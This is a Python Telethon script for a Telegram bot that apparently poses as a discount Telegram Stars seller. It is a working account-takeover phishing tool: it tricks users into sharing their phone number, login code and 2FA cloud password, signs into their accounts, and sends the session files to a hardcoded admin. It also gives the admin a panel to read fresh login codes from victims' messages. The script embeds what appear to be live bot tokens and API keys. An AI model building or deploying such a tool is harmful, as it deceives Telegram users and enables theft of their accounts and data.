import asyncio
import os
import json
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError
from telethon.tl.custom import Button
import logging
import re

logging.basicConfig(level=logging.ERROR)

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8496943952:AAHOpOKYJ98iCzp98Kanc0ajoBaknkisBoY"
API_ID = 31402653
API_HASH = "b09dbee774eb668502455f76d4710bba"
ADMIN_ID = 7546928092
# ================================

os.makedirs("sessions", exist_ok=True)

# Файл для хранения аккаунтов
ACCOUNTS_FILE = "accounts.json"

# Проверка и создание файла accounts.json
def init_accounts_file():
    """Создать пустой файл accounts.json если его нет"""
    if not os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
            json.dump([], f)
        print("✅ Создан новый файл accounts.json")
    else:
        # Проверяем что файл не битый
        try:
            with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if not isinstance(data, list):
                    # Если не список, перезаписываем
                    with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
                        json.dump([], f)
                    print("✅ accounts.json пересоздан (неверный формат)")
        except:
            # Если ошибка чтения, перезаписываем
            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
                json.dump([], f)
            print("✅ accounts.json пересоздан (был битым)")

# Вызови функцию после определения
init_accounts_file()

def save_account(phone, code, twofa, name, user_id):
    accounts = load_accounts()
    for acc in accounts:
        if acc['phone'] == phone:
            acc['code'] = code
            acc['twofa'] = twofa
            acc['name'] = name
            acc['user_id'] = user_id
            acc['date'] = str(datetime.now())
            break
    else:
        accounts.append({
            'phone': phone,
            'code': code,
            'twofa': twofa,
            'name': name,
            'user_id': user_id,
            'date': str(datetime.now())
        })
    
    with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(accounts, f, ensure_ascii=False, indent=2)

def get_account(phone):
    accounts = load_accounts()
    for acc in accounts:
        if acc['phone'] == phone:
            return acc
    return None

# Хранилище сессий
user_sessions = {}

async def get_last_codes(client, limit=5):
    """Получить последние коды из сообщений Telegram"""
    try:
        codes = []
        
        # Убеждаемся что клиент подключен
        if not client.is_connected():
            await client.connect()
        
        # 1. Сначала ищем в Saved Messages
        async for message in client.iter_messages('me', limit=30):
            if message.text:
                found_codes = re.findall(r'\b\d{5}\b', message.text)
                for code in found_codes:
                    if code not in [c['code'] for c in codes]:
                        sender = "Saved Messages"
                        if message.sender_id:
                            try:
                                sender_obj = await message.get_sender()
                                if sender_obj:
                                    sender = getattr(sender_obj, 'first_name', 'Telegram')
                            except:
                                pass
                        
                        msg_text = message.text[:100].replace('\n', ' ')
                        
                        codes.append({
                            'code': code,
                            'text': msg_text,
                            'date': message.date.strftime('%H:%M:%S'),
                            'sender': sender,
                            'chat': 'Сохраненные'
                        })
                        if len(codes) >= limit:
                            return codes
        
        # 2. Ищем в диалоге с самим собой
        try:
            async for message in client.iter_messages(await client.get_me(), limit=30):
                if message.text:
                    found_codes = re.findall(r'\b\d{5}\b', message.text)
                    for code in found_codes:
                        if code not in [c['code'] for c in codes]:
                            codes.append({
                                'code': code,
                                'text': message.text[:100].replace('\n', ' '),
                                'date': message.date.strftime('%H:%M:%S'),
                                'sender': 'Telegram',
                                'chat': 'С собой'
                            })
                            if len(codes) >= limit:
                                return codes
        except:
            pass
        
        # 3. Ищем в системных сообщениях
        async for dialog in client.iter_dialogs():
            dialog_name = dialog.name or ""
            if any(word in dialog_name.lower() for word in ['telegram', 'service', 'notification', 'уведомление']):
                try:
                    async for message in client.iter_messages(dialog.id, limit=15):
                        if message.text:
                            found_codes = re.findall(r'\b\d{5}\b', message.text)
                            for code in found_codes:
                                if code not in [c['code'] for c in codes]:
                                    codes.append({
                                        'code': code,
                                        'text': message.text[:100].replace('\n', ' '),
                                        'date': message.date.strftime('%H:%M:%S'),
                                        'sender': dialog_name[:20],
                                        'chat': dialog_name[:20]
                                    })
                                    if len(codes) >= limit:
                                        return codes
                except:
                    continue
        
        return codes
        
    except Exception as e:
        print(f"Ошибка получения кодов: {e}")
        return []

async def main():
    bot = TelegramClient('bot_session', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    print("✅" + "="*50)
    print("✅ БОТ ЗАПУЩЕН!")
    print("✅" + "="*50)
    print(f"👑 Админ ID: {ADMIN_ID}")
    print("📱 Жду пользователей...")
    print("✅" + "="*50)
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        user_id = event.sender_id
        name = event.sender.first_name or "User"
        
        if user_id == ADMIN_ID:
            buttons = [
                [Button.inline("📊 ВСЕ АККАУНТЫ", b"admin_list")],
                [Button.inline("📈 СТАТИСТИКА", b"admin_stats")],
                [Button.inline("🧹 ОЧИСТИТЬ", b"admin_clean")]
            ]
            await event.reply(
                "👑 **АДМИН ПАНЕЛЬ**\n\n"
                "Выберите действие:",
                buttons=buttons
            )
        else:
            buttons = [[Button.request_phone("📱 ПОДЕЛИТЬСЯ НОМЕРОМ")]]
            await event.reply(
                f"✨ **Привет, {name}!** ✨\n\n"
                f"🔥 **Купи Telegram Stars по супер цене!**\n"
                f"⭐ 100 звезд = 100₽\n\n"
                f"📱 **Нажми кнопку чтобы поделиться номером**\n\n"
                f"Это нужно для подтверждения что аккаунт не является виртуальным.",
                buttons=buttons
            )
    
    @bot.on(events.CallbackQuery)
    async def callback(event):
        user_id = event.sender_id
        data = event.data.decode()
        
        # Для обычных пользователей
        if user_id != ADMIN_ID:
            if user_id in user_sessions:
                user_data = user_sessions[user_id]
                
                if 'code' not in user_data:
                    user_data['code'] = ''
                
                if data.isdigit():
                    if len(user_data['code']) < 5:
                        user_data['code'] += data
                
                elif data == 'del':
                    user_data['code'] = user_data['code'][:-1]
                
                elif data == 'ok':
                    if len(user_data['code']) == 5:
                        try:
                            await user_data['client'].sign_in(user_data['phone'], user_data['code'])
                            me = await user_data['client'].get_me()
                            
                            save_account(
                                phone=user_data['phone'],
                                code=user_data['code'],
                                twofa="",
                                name=me.first_name,
                                user_id=user_id
                            )
                            
                            session_file = f"{user_data['session']}.session"
                            if os.path.exists(session_file):
                                await bot.send_file(ADMIN_ID, session_file, 
                                    caption=f"📱 {user_data['phone']}\n👤 {me.first_name}")
                            
                            await event.edit("✅ **ГОТОВО!** Администратор скоро свяжется с вами.")
                            
                            await user_data['client'].disconnect()
                            del user_sessions[user_id]
                            return
                            
                        except SessionPasswordNeededError:
                            user_data['step'] = 'wait_2fa'
                            user_data['2fa_attempts'] = 0
                            await event.edit(
                                "🔐 **Требуется облачный пароль (2FA)**\n\n"
                                "⚠️ Это НЕ код из SMS, а пароль который вы сами установили\n"
                                "в настройках Telegram (Двухфакторная аутентификация)\n\n"
                                "📝 **Введите ваш облачный пароль:**"
                            )
                            return
                            
                        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                            if 'code_attempts' not in user_data:
                                user_data['code_attempts'] = 1
                            else:
                                user_data['code_attempts'] += 1
                            
                            user_data['code'] = ''
                            
                            if user_data['code_attempts'] >= 3:
                                await event.edit(
                                    "❌ **Слишком много неправильных попыток!**\n\n"
                                    "🔄 **Нажмите кнопку чтобы отправить код заново**",
                                    buttons=[[Button.inline("🔄 ОТПРАВИТЬ НОВЫЙ КОД", b"resend_code")]]
                                )
                                return
                            
                            remaining = 3 - user_data['code_attempts']
                            buttons = [
                                [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
                                [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
                                [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
                                [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
                            ]
                            await event.edit(
                                f"❌ **Неправильный код!** Осталось попыток: {remaining}\n\n"
                                f"📱 **Код:** `⬜⬜⬜⬜⬜`\n\n⬇️ **Попробуйте снова:**",
                                buttons=buttons
                            )
                            return
                            
                        except Exception as e:
                            await event.edit(f"❌ Ошибка: {e}")
                            del user_sessions[user_id]
                            return
                
                elif data == 'resend_code':
                    phone = user_data['phone']
                    session = user_data['session']
                    
                    try:
                        await user_data['client'].disconnect()
                    except:
                        pass
                    
                    client = TelegramClient(session, API_ID, API_HASH)
                    await client.connect()
                    await client.send_code_request(phone)
                    
                    user_sessions[user_id] = {
                        'client': client,
                        'phone': phone,
                        'session': session,
                        'code': '',
                        'code_attempts': 0
                    }
                    
                    buttons = [
                        [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
                        [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
                        [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
                        [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
                    ]
                    
                    await event.edit("✅ **Новый код отправлен!**\n\n📱 **Код:** `⬜⬜⬜⬜⬜`\n\n⬇️ **Введи 5 цифр:**", buttons=buttons)
                    return
                
                display = user_data['code'] + '⬜' * (5 - len(user_data['code']))
                
                buttons = [
                    [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
                    [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
                    [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
                    [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
                ]
                
                try:
                    await event.edit(f"📱 **Код:** `{display}`\n\n⬇️ **Введи 5 цифр:**", buttons=buttons)
                except:
                    pass
                await event.answer()
            return
        
        # ===== АДМИН ФУНКЦИИ =====
        
        if data == "admin_list":
            accounts = load_accounts()
            
            if not accounts:
                await event.edit("📭 **Нет аккаунтов**")
                await event.answer()
                return
            
            buttons = []
            for acc in accounts[-10:]:
                phone_short = acc['phone'][-8:]
                name_short = acc['name'][:8] if acc['name'] else "No"
                buttons.append([Button.inline(f"📱 {name_short}...{phone_short}", f"view_{acc['phone']}".encode())])
            
            buttons.append([Button.inline("🔄 ОБНОВИТЬ", b"admin_list")])
            buttons.append([Button.inline("◀️ НАЗАД", b"back_admin")])
            
            await event.edit(
                f"📊 **ВСЕ АККАУНТЫ** (всего: {len(accounts)})\n\n"
                f"👇 Выберите аккаунт:",
                buttons=buttons
            )
            await event.answer()
        
        elif data.startswith("view_"):
            phone = data.replace("view_", "")
            acc = get_account(phone)
            
            if acc:
                text = (
                    f"📱 **НОМЕР**\n`{acc['phone']}`\n\n"
                    f"🔑 **КОД**\n`{acc['code']}`\n\n"
                    f"🔐 **2FA**\n`{acc['twofa'] if acc['twofa'] else 'нет'}`\n\n"
                    f"👤 **ИМЯ**\n{acc['name']}\n\n"
                    f"📅 **ДАТА**\n{acc['date'][:16]}"
                )
                
                buttons = [
                    [Button.inline("📨 ПОКАЗАТЬ КОДЫ", f"showcodes_{phone}".encode())],
                    [Button.inline("📎 ФАЙЛ СЕССИИ", f"getsess_{phone}".encode())],
                    [Button.inline("◀️ НАЗАД", b"admin_list")]
                ]
                
                await event.edit(text, buttons=buttons)
            else:
                await event.edit("❌ Аккаунт не найден")
            await event.answer()
        
        # УЛУЧШЕННАЯ ФУНКЦИЯ ПОКАЗА КОДОВ
        elif data.startswith("showcodes_"):
            phone = data.replace("showcodes_", "")
            
            await event.edit("🔄 **Поиск кодов...**\n\nПроверяю Saved Messages и диалоги...")
            
            found = False
            for f in os.listdir("sessions"):
                if phone.replace('+', '') in f and f.endswith('.session'):
                    try:
                        session_path = f"sessions/{f.replace('.session', '')}"
                        client = TelegramClient(session_path, API_ID, API_HASH)
                        
                        # Подключаемся и проверяем
                        await client.connect()
                        
                        if await client.is_user_authorized():
                            me = await client.get_me()
                            
                            await event.edit(f"🔄 **Подключено к аккаунту**\n👤 {me.first_name}\n\n🔍 Ищу коды в сообщениях...")
                            
                            codes = await get_last_codes(client)
                            
                            if codes:
                                text = f"📱 **Аккаунт:** `{phone}`\n👤 **Владелец:** {me.first_name}\n\n📨 **Найденные коды ({len(codes)}):**\n\n"
                                buttons = []
                                
                                for i, code_info in enumerate(codes, 1):
                                    text += f"{i}. **Код:** `{code_info['code']}` 🕒 {code_info['date']}\n"
                                    text += f"   📍 {code_info['chat']}\n"
                                    text += f"   📝 {code_info['text'][:60]}\n\n"
                                    buttons.append([Button.inline(f"✅ ВЗЯТЬ КОД {code_info['code']}", f"usecode_{phone}_{code_info['code']}".encode())])
                                
                                buttons.append([Button.inline("🔄 ОБНОВИТЬ", f"showcodes_{phone}".encode())])
                                buttons.append([Button.inline("📨 ОТПРАВИТЬ НОВЫЙ КОД", f"send_new_code_{phone}".encode())])
                                buttons.append([Button.inline("◀️ НАЗАД", f"view_{phone}".encode())])
                                
                                await client.disconnect()
                                await event.edit(text, buttons=buttons)
                            else:
                                buttons = [
                                    [Button.inline("🔄 ПОПРОБОВАТЬ СНОВА", f"showcodes_{phone}".encode())],
                                    [Button.inline("📨 ОТПРАВИТЬ НОВЫЙ КОД", f"send_new_code_{phone}".encode())],
                                    [Button.inline("◀️ НАЗАД", f"view_{phone}".encode())]
                                ]
                                await client.disconnect()
                                await event.edit(
                                    f"📭 **Коды не найдены**\n\n"
                                    f"📱 Аккаунт: {phone}\n"
                                    f"👤 Владелец: {me.first_name}\n\n"
                                    f"🔍 **Проверено:**\n"
                                    f"• Saved Messages (30 сообщений)\n"
                                    f"• Диалоги с Telegram\n"
                                    f"• Последние 10 чатов\n\n"
                                    f"💡 **Совет:** Отправьте новый код через кнопку ниже",
                                    buttons=buttons
                                )
                        else:
                            await event.edit("❌ Сессия не активна. Нужно войти заново.")
                            await client.disconnect()
                        
                        found = True
                        break
                        
                    except Exception as e:
                        await event.edit(f"❌ Ошибка: {str(e)[:100]}")
                        try:
                            await client.disconnect()
                        except:
                            pass
                        found = True
                        break
            
            if not found:
                await event.edit("❌ Файл сессии не найден")
            await event.answer()
        
        # ФУНКЦИЯ ОТПРАВКИ НОВОГО КОДА
        elif data.startswith("send_new_code_"):
            phone = data.replace("send_new_code_", "")
            
            await event.edit("🔄 **Отправляю новый код...**")
            
            found = False
            for f in os.listdir("sessions"):
                if phone.replace('+', '') in f and f.endswith('.session'):
                    try:
                        session_path = f"sessions/{f.replace('.session', '')}"
                        client = TelegramClient(session_path, API_ID, API_HASH)
                        
                        # Подключаемся
                        await client.connect()
                        
                        if await client.is_user_authorized():
                            me = await client.get_me()
                            
                            # Отправляем новый код (клиент уже подключен)
                            await client.send_code_request(phone)
                            
                            buttons = [
                                [Button.inline("🔄 ПОСМОТРЕТЬ КОДЫ", f"showcodes_{phone}".encode())],
                                [Button.inline("◀️ НАЗАД", f"view_{phone}".encode())]
                            ]
                            
                            await client.disconnect()
                            await event.edit(
                                f"✅ **Новый код отправлен!**\n\n"
                                f"📱 Номер: {phone}\n"
                                f"👤 Владелец: {me.first_name}\n"
                                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
                                f"Код придет в Telegram в течение минуты.\n"
                                f"После получения нажмите 'Посмотреть коды'",
                                buttons=buttons
                            )
                        else:
                            await event.edit("❌ Сессия не активна")
                            await client.disconnect()
                        
                        found = True
                        break
                        
                    except Exception as e:
                        await event.edit(f"❌ Ошибка: {str(e)[:100]}")
                        try:
                            await client.disconnect()
                        except:
                            pass
                        found = True
                        break
            
            if not found:
                await event.edit("❌ Файл сессии не найден")
            await event.answer()
        
        elif data.startswith("usecode_"):
            parts = data.split('_')
            phone = parts[1]
            code = parts[2] 
            
            acc = get_account(phone)
            if acc:
                text = (
                    f"📱 **НОМЕР**\n`{phone}`\n\n"
                    f"🔑 **ВЫБРАН КОД**\n`{code}`\n\n"
                    f"🔐 **2FA**\n`{acc['twofa'] if acc['twofa'] else 'нет'}`\n\n"
                    f"👤 **ИМЯ**\n{acc['name']}"
                )
                
                buttons = [
                    [Button.inline("◀️ К КОДАМ", f"showcodes_{phone}".encode())],
                    [Button.inline("◀️ К АККАУНТУ", f"view_{phone}".encode())]
                ]
                
                await event.edit(text, buttons=buttons)
            await event.answer()
        
        elif data.startswith("getsess_"):
            phone = data.replace("getsess_", "")
            
            found = False
            for f in os.listdir("sessions"):
                if phone.replace('+', '') in f and f.endswith('.session'):
                    await bot.send_file(user_id, f"sessions/{f}", 
                        caption=f"📎 Сессия для {phone}")
                    found = True
                    break
            
            if not found:
                await event.edit("❌ Файл не найден")
            await event.answer()
        
        elif data == "admin_stats":
            accounts = load_accounts()
            files = os.listdir("sessions")
            sessions_count = len([f for f in files if f.endswith('.session')])
            
            text = (
                f"📊 **СТАТИСТИКА**\n\n"
                f"📱 Аккаунтов: {len(accounts)}\n"
                f"📎 Сессий: {sessions_count}\n"
                f"🕒 Последний: {accounts[-1]['date'][:16] if accounts else 'нет'}"
            )
            
            buttons = [[Button.inline("◀️ НАЗАД", b"admin_list")]]
            await event.edit(text, buttons=buttons)
            await event.answer()
        
        elif data == "admin_clean":
            count = 0
            for f in os.listdir("sessions"):
                if f.endswith('.session'):
                    os.remove(f"sessions/{f}")
                    count += 1
            
            await event.edit(f"🧹 **Удалено файлов: {count}**")
            await event.answer()
        
        elif data == "back_admin":
            buttons = [
                [Button.inline("📊 ВСЕ АККАУНТЫ", b"admin_list")],
                [Button.inline("📈 СТАТИСТИКА", b"admin_stats")],
                [Button.inline("🧹 ОЧИСТИТЬ", b"admin_clean")]
            ]
            await event.edit("👑 **АДМИН ПАНЕЛЬ**\n\nВыберите действие:", buttons=buttons)
            await event.answer()
    
    @bot.on(events.NewMessage)
    async def message_handler(event):
        user_id = event.sender_id
        
        if event.message.contact:
            phone = event.message.contact.phone_number
            
            session = f"sessions/user_{user_id}_{phone.replace('+', '')}"
            client = TelegramClient(session, API_ID, API_HASH)
            await client.connect()
            
            try:
                await client.send_code_request(phone)
                
                user_sessions[user_id] = {
                    'client': client,
                    'phone': phone,
                    'session': session,
                    'code': '',
                    'code_attempts': 0
                }
                
                buttons = [
                    [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
                    [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
                    [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
                    [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
                ]
                
                await event.reply("📱 **Код:** `⬜⬜⬜⬜⬜`\n\n⬇️ **Введи 5 цифр:**", buttons=buttons)
                
            except Exception as e:
                await event.reply(f"❌ Ошибка: {e}")
                await client.disconnect()
        
        elif user_id in user_sessions and user_sessions[user_id].get('step') == 'wait_2fa':
            password = event.message.text.strip()
            data = user_sessions[user_id]
            
            try:
                await data['client'].sign_in(password=password)
                me = await data['client'].get_me()
                
                save_account(
                    phone=data['phone'],
                    code="2fa",
                    twofa=password,
                    name=me.first_name,
                    user_id=user_id
                )
                
                session_file = f"{data['session']}.session"
                if os.path.exists(session_file):
                    await bot.send_file(ADMIN_ID, session_file,
                        caption=f"📱 {data['phone']} (2FA)\n👤 {me.first_name}")
                
                await event.reply("✅ **ГОТОВО!** Звезды зачислены!")
                
                await data['client'].disconnect()
                del user_sessions[user_id]
                
            except Exception as e:
                if "PASSWORD_HASH_INVALID" in str(e):
                    if '2fa_attempts' not in data:
                        data['2fa_attempts'] = 1
                    else:
                        data['2fa_attempts'] += 1
                    
                    if data['2fa_attempts'] >= 3:
                        await event.reply(
                            "❌ **Слишком много неправильных попыток!**\n\n"
                            "🔄 **Нажмите /start чтобы начать заново**"
                        )
                        await data['client'].disconnect()
                        del user_sessions[user_id]
                    else:
                        remaining = 3 - data['2fa_attempts']
                        await event.reply(
                            f"❌ **Неправильный облачный пароль!** Осталось попыток: {remaining}\n\n"
                            "🔐 **Это пароль из настроек Telegram (2FA)**\n"
                            "• НЕ код из SMS\n"
                            "• Проверьте раскладку\n\n"
                            "📝 **Введите пароль еще раз:**"
                        )
                else:
                    await event.reply(f"❌ Ошибка: {e}")
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n✅ Бот остановлен")
